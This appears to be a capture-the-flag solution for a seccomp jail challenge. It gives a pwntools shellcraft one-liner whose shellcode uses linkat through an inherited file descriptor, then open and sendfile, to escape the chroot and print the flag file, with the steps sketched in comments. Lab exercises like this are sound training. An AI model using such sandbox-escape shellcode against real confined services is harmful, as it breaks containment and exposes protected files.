# Seccomp Linkat

# linkat(3, "flag", AT_FDCWD, "f", 0);
# fd = open("f", O_RDONLY);
# sendfile(1, fd, NULL, 0x40);
pwn shellcraft amd64.linkat 3 flag -100 f 0 + amd64.open f 0 + amd64.sendfile 1 rax 0 64 | /challenge/babyjail_level5 /